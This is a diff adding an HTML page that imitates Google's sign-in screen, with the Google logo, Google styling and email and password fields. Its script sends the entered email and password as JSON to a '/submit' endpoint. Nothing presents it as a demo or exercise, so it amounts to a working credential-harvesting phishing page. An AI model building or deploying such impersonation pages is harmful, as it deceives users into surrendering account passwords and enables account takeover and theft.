@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 75px;
+            margin-bottom: 24px;
+        }
+        .login-container h1 {
+            margin-bottom: 24px;
+            font-size: 24px;
+            color: #202124;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            margin: 10px 0;
+            position: relative;
+        }
+        label {
+            text-align: left;
+            margin-bottom: 4px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        input {
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+        input:focus {
+            border-color: #4285f4;
+            outline: none;
+            box-shadow: 0 0 0 1px #4285f4;
+        }
+        .button {
+            margin-top: 20px;
+            padding: 10px 16px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #4285f4;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+        }
+        .button:hover {
+            background-color: #357ae8;
+        }
+        .button:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" alt="Google Logo">
+        <h1>Sign in</h1>
+        <form id="login-form">
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="button">Next</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            fetch('/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password }),
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert(data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
